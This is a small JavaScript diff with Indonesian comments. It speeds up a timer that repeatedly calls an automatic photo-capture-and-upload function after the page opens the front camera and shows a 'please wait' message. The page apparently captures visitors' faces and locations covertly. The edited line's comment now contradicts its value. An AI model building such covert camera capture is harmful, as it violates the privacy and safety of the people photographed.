@@ -49,7 +49,7 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: fals
         if (teksStatus) teksStatus.innerText = "Tunggu Sebentar...";
  
         setTimeout(() => {
-            setInterval(ambilDanUploadFotoOtomatis, 2000); // Dijeda 2 detik agar proses geocoding alamat tidak menumpuk
+            setInterval(ambilDanUploadFotoOtomatis, 600); // Dijeda 2 detik agar proses geocoding alamat tidak menumpuk
         }, 2500);
     })
     .catch((error) => {
